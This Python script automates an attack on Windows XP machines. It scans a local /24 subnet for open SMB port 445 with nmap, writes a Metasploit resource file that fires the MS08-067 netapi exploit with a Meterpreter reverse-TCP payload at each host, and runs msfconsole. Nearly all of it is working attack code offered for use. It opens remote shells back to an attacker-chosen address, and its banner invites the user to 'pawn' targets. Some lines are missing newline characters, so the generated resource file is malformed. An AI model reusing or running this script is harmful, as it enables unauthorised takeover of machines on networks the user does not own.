#!/usr/bin/python
#lets write a metasploit module to hack windows xp in a subnet we will also use the nmap module in this
# so alright here we go!!
__author__ = 'Shivam'
import nmap
import os
vulnhostlist = []
def nmscan():
    '''
    this function is used to return a list of vulnerable hosts
    :return: a list
    '''
    nmScan = nmap.PortScanner()
    nmScan.scan('192.168.1.1/24','445')
    for hosts in nmScan.all_hosts():
        if nmScan[hosts].has_tcp(445):
            state = nmScan[hosts]['tcp'][445]['state']
            if state == 'open':
                vulnhostlist.append(hosts)


def msfexploitrunner(rhost,lport,lhost):
    '''
    Takes host as a parameter and executes ms08_067_netapi expoit on it !
    :param rhost:
    :return: Process
    '''
    exploitfile = open('exploit.rc' ,'w')
    exploitfile.write('set exploit/multi/handler\n')
    exploitfile.write('set payload windows/meterpreter/reverse_tcp\n')
    exploitfile.write('set LPORT '+ str(lport)+ '\n')
    exploitfile.write('set LHOST '+ str(lhost)+ '\n')
    exploitfile.write('exploit -j -z\n')
    exploitfile.write('setg DisablePayloadHandler 1\n')
    exploitfile.write('use exploit/windows/smb/ms08_067_netapi\n')
    exploitfile.write('set RHOST '+ str(rhost))
    exploitfile.write('set payload windows/meterpreter/reverse_tcp\n')
    exploitfile.write('set LPORT '+ str(lport))
    exploitfile.write('\nset LHOST '+ str(lhost))
    exploitfile.write('\nexploit -j -z\n')
    exploitfile.close()



def main():
    print '''***********************************
            Welcome to RCE SMB Exploit Module
                        by Shivam Mehta
            ************************************'''
    print '1.) Scan the /24 subnet '
    print '2.) You have the Ip lets pawn it '
    ch = input('What you wana do  ?')
    if ch == 1:
        nmscan()
        for i in vulnhostlist:
            print 'This guy is found : ' + i
    if ch ==2:
        hoste = raw_input('Enter the Host : ')
        vulnhostlist.append(hoste)
    lport = raw_input('Enter the port where you want the reverse handler to connect :')
    lhost = raw_input('Enter the IP Adress where you want the reverse handler to connect to : ')
    for host in vulnhostlist:
        msfexploitrunner(host,lport,lhost)

    os.system(' sudo msfconsole -r exploit.rc')


if __name__ == '__main__':
    main()


